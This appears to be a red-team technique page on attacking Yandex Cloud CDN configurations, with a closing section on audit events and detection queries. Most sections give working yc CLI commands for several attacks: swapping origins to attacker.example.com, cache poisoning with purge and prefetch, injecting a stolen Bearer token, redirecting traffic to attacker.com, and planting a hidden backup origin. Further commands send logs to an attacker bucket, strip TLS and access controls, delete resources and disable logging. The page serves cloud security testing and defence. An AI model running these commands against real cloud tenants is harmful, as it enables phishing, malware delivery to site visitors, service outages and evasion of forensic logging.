# Yandex Cloud - CDN Techniques

## Service Overview

Yandex Cloud CDN is a content delivery network service (powered by Gcore infrastructure) that caches and serves content from globally distributed edge servers. Content is sourced from **origins** (custom servers, Object Storage buckets, or L7 Application Load Balancers) and distributed via **CDN resources** with configurable domain names, caching, security, and routing settings.

Key concepts:
- **CDN Resource**: The main configuration entity — links domain names to origins, defines caching, security, and delivery settings
- **Origin Groups**: Collections of origins with active/backup failover and round-robin load distribution
- **Origins**: Backend servers (custom domain, Object Storage bucket, or ALB) that serve the original content
- **Secure Tokens**: MD5-based signed links restricting content access (secret key stored in resource settings)
- **Location Rules**: Regex-based URI path overrides for per-path CDN settings (caching, tokens, IP ACL, headers)
- **Log Export**: CDN request logs exported to Object Storage buckets (API-only, no CLI)
- Settings changes take up to **15 minutes** to propagate; cached content evicts after **36 hours** without requests
- `cdn.editor` on a folder grants full control over ALL CDN resources and origin groups in that folder — no resource-level granularity

---

## Enumeration

### Enumerate CDN Resources

```bash
# List all CDN resources in folder
yc cdn resource list

# Get CDN resource details (all settings)
yc cdn resource get <RESOURCE-ID>

# Get the CDN load balancer CNAME
yc cdn resource get-provider-cname

# List activated CDN providers
yc cdn provider list-activated
```

### Enumerate Origins

```bash
# List all origin groups
yc cdn origin-group list

# Get origin group details
yc cdn origin-group get <ORIGIN-GROUP-ID>

# List origins within a group
yc cdn origin list <ORIGIN-GROUP-ID>

# Get origin details
yc cdn origin get <ORIGIN-ID>
```

---

## Lateral Movement

### Origin Hijacking — Redirect to Attacker Server

Replace the origin to serve attacker-controlled content through the legitimate CDN domain:

```bash
# Update origin group to point to attacker's server
yc cdn origin-group update --id <GROUP-ID> \
  --origin source=attacker.example.com,enabled=true

# Or update an individual origin
yc cdn origin update --id <ORIGIN-ID> \
  --source attacker.example.com --enabled

# Or create a new resource with attacker-controlled origin
yc cdn resource create cdn.victim.com \
  --origin-custom-source attacker.example.com \
  --origin-protocol HTTP
```

All content served via the CDN is now sourced from the attacker's server — enabling content injection, credential phishing, and malware delivery.

### Cache Poisoning Attack Chain

Modify the origin, purge the cache, then prefetch malicious content:

```bash
# Step 1: Swap origin to attacker server (see above)

# Step 2: Purge entire CDN cache
yc cdn cache purge --resource-id <RESOURCE-ID> --all

# Step 3: Prefetch attacker content into cache
yc cdn cache prefetch --resource-id <RESOURCE-ID> \
  --path /login.js,/config.json,/index.html
```

The CDN serves the attacker's content to all users for up to 36 hours (or configured cache lifetime).

### Host Header Manipulation

Manipulate the Host header sent from CDN to origin to access unintended backends:

```bash
# Set arbitrary Host header for CDN-to-origin requests
yc cdn resource update --id <RESOURCE-ID> \
  --host-header internal-service.local

# Forward client-provided Host header to origin
yc cdn resource update --id <RESOURCE-ID> --forward-host-header
```

For bucket origins, the Host header determines which bucket is accessed — changing it can expose different buckets.

### HTTP Header Injection

```bash
# Inject custom response headers (e.g., for XSS, cache-control override)
yc cdn resource update --id <RESOURCE-ID> \
  --static-headers "X-Custom-Header=malicious-value"

# Inject headers in CDN-to-origin requests (e.g., stolen auth tokens)
yc cdn resource update --id <RESOURCE-ID> \
  --static-request-headers "Authorization=Bearer stolen_token"

# Open CORS to all origins
yc cdn resource update --id <RESOURCE-ID> --cors '*'
```

### Rewrite Rules for Request Redirection

```bash
# Redirect all requests to attacker-controlled URL (302)
yc cdn resource update --id <RESOURCE-ID> \
  --rewrite-flag redirect \
  --rewrite-body '/(.*) https://attacker.com/$1'

# Permanent redirect (301) — cached by browsers
yc cdn resource update --id <RESOURCE-ID> \
  --rewrite-flag permanent \
  --rewrite-body '/(.*) /attacker-path/$1'
```

---

## Persistence

### Subtle Origin Injection

Add an attacker origin as a backup in an origin group — it only activates when primary origins return 5xx errors:

```bash
# Update origin group to add attacker as backup origin
yc cdn origin-group update --id <GROUP-ID> \
  --origin source=legitimate-server.com,enabled=true \
  --origin source=attacker.example.com,enabled=true,backup=true
```

The attacker origin is only used during primary failures, making it harder to detect.

### Log Export Redirection

Redirect CDN request logs to an attacker-controlled bucket for ongoing intelligence:

```bash
# Via API: Redirect log export to attacker bucket
# POST https://cdn.api.cloud.yandex.net/cdn/v1/rawLogs:activate
# Body: { "resourceId": "<id>", "settings": { "bucketName": "attacker-bucket" } }
```

---

## Post-Exploitation

### Disable Security Controls

```bash
# Disable secure token protection (expose content via regular links)
yc cdn resource update --id <RESOURCE-ID> --clear-secure-key

# Remove IP-based access restrictions
yc cdn resource update --id <RESOURCE-ID> --clear-ip-address-acl

# Allow all HTTP methods (enable PUT/DELETE/POST)
yc cdn resource update --id <RESOURCE-ID> \
  --allowed-http-methods GET,HEAD,POST,PUT,PATCH,DELETE,OPTIONS

# Remove rewrite rules
yc cdn resource update --id <RESOURCE-ID> --clear-rewrite
```

### TLS Downgrade

```bash
# Remove SSL certificate (downgrade to HTTP-only)
yc cdn resource update --id <RESOURCE-ID> --dont-use-ssl-cert

# Redirect HTTPS to HTTP
yc cdn resource update --id <RESOURCE-ID> --redirect-https-to-http

# Downgrade CDN-to-origin traffic to HTTP (unencrypted)
yc cdn resource update --id <RESOURCE-ID> --origin-protocol HTTP
```

### Service Disruption

```bash
# Disable a CDN resource
yc cdn resource update --id <RESOURCE-ID> --active false

# Delete a CDN resource
yc cdn resource delete <RESOURCE-ID>

# Delete origin groups
yc cdn origin-group delete <ORIGIN-GROUP-ID>

# Delete individual origins
yc cdn origin delete <ORIGIN-ID>
```

### Anti-Forensics — Disable Logging

```bash
# Via API: Disable log export
# POST https://cdn.api.cloud.yandex.net/cdn/v1/rawLogs:deactivate
# Body: { "resourceId": "<id>" }
```

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `cdn.viewer` | View CDN resources, origin groups, and quotas |
| `cdn.editor` | Viewer + create/modify/delete resources, origin groups, origins; manage logs and shielding |
| `cdn.admin` | Same as editor (future additional capabilities planned) |

`cdn.editor` at the folder level grants full control over ALL CDN resources in the folder — no resource-level granularity.

---

## Detection and Logging

### Audit Trail Events

Source: `yandex.cloud.audit.cdn.gcore.*`

| Event | Description | Security Relevance |
|---|---|---|
| `gcore.ResourceCreate` | Creating a CDN resource | New content distribution point |
| `gcore.ResourceUpdate` | Changing resource settings | **Covers ALL config changes** (origin swap, SSL, tokens, ACL, headers, rewrites) |
| `gcore.ResourceDelete` | Deleting a resource | Service disruption |
| `gcore.OriginCreate` | Creating an origin | New backend server |
| `gcore.OriginUpdate` | Changing an origin | **Origin hijacking** |
| `gcore.OriginDelete` | Deleting an origin | Removing legitimate backend |
| `gcore.OriginGroupCreate` | Creating an origin group | New origin group |
| `gcore.OriginGroupUpdate` | Updating an origin group | **Origin group manipulation** |
| `gcore.OriginGroupDelete` | Deleting an origin group | Removing origin group |
| `gcore.CachePurge` | Purging cache | Cache manipulation |
| `gcore.CachePrefetch` | Preloading cache | **Prefetching malicious content** |
| `gcore.ProviderActivate` | Activating CDN provider | Initial setup |
| `gcore.RawLogsActivate` | Enabling log export | Log configuration |
| `gcore.RawLogsDeactivate` | Disabling log export | **Anti-forensics** |
| `gcore.RawLogsUpdate` | Updating log settings | **Log redirection** |
| `gcore.ResourceRuleCreate` | Creating a location rule | Per-path overrides |
| `gcore.ResourceRuleUpdate` | Updating a location rule | Modifying per-path settings |
| `gcore.ResourceRuleDelete` | Deleting a location rule | Removing per-path overrides |

### Key Detection Gaps

- **Only control plane events**: Individual content requests through CDN are not logged in Audit Trails
- **`ResourceUpdate` is coarse**: A single event covers all configuration changes — cannot distinguish between routine updates and security-critical changes (SSL removal, token disabling, origin swap) without inspecting event details
- **CDN data plane logs** require separate log export configuration to Object Storage
- **15-minute propagation delay**: Changes take up to 15 minutes to take effect, creating a window for detection before impact

### Detection Queries

**Detect origin manipulation**:
```
event_type IN ("gcore.OriginUpdate", "gcore.OriginGroupUpdate", "gcore.OriginCreate")
```

**Detect cache manipulation attack chain**:
```
event_type IN ("gcore.CachePurge", "gcore.CachePrefetch")
-- Correlate with recent OriginUpdate events
```

**Detect security control removal**:
```
event_type = "gcore.ResourceUpdate"
-- Inspect event details for: secure token removal, SSL removal, IP ACL clearing
```

**Detect anti-forensics**:
```
event_type IN ("gcore.RawLogsDeactivate", "gcore.RawLogsUpdate")
```

---

## References

- CDN Concepts: `en/cdn/concepts/index.md`
- CDN Resource: `en/cdn/concepts/resource.md`
- Origins: `en/cdn/concepts/origins.md`
- Caching: `en/cdn/concepts/caching.md`
- Secure Tokens: `en/cdn/concepts/secure-tokens.md`
- IP ACL: `en/cdn/concepts/ip-address-acl.md`
- HTTP Rewrite: `en/cdn/concepts/http-rewrite.md`
- TLS Certificates: `en/cdn/concepts/clients-to-servers-tls.md`
- Host Header: `en/cdn/concepts/servers-to-origins-host.md`
- Location Rules: `en/cdn/concepts/location-rules.md`
- Log Export: `en/cdn/concepts/logs.md`
- Security: `en/cdn/security/index.md`
- CLI Reference: `en/cdn/cli-ref/`
- Audit Events: `en/_includes/audit-trails/events/cdn-events.md`
